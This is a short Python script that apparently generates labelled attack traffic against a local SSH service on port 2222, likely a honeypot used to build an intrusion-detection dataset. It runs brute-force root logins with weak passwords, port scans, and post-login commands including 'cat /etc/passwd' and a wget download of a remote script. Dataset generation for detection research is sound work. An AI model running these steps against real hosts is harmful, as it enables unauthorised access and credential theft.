import paramiko, socket, random, time, csv

H, P = "127.0.0.1", 2222
labels = []

def log(kind):
    labels.append([time.strftime("%Y-%m-%dT%H:%M:%S"), kind])

def ssh(user, pw, cmds=None):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(H, P, user, pw, timeout=5,
                  allow_agent=False, look_for_keys=False)
        for cmd in cmds or []:
            c.exec_command(cmd)
            time.sleep(0.3)
    except Exception:
        pass
    finally:
        c.close()

for _ in range(40):          # brute force
    log("brute_force")
    for pw in ["root", "123456"]:
        ssh("root", pw)

for _ in range(40):          # scanning
    log("scanning")
    try:
        s = socket.create_connection((H, P), timeout=3)
        s.close()
    except Exception:
        pass
    time.sleep(0.2)

cmds = ["ls", "whoami", "uname -a", "cat /etc/passwd",
        "wget http://example.com/x.sh", "ps", "id"]
for _ in range(40):          # command execution
    log("command_exec")
    ssh("admin", "test@123", random.sample(cmds, 4))

with open("labels.csv", "w", newline="") as f:
    csv.writer(f).writerows([["time", "label"]] + labels)
print("done")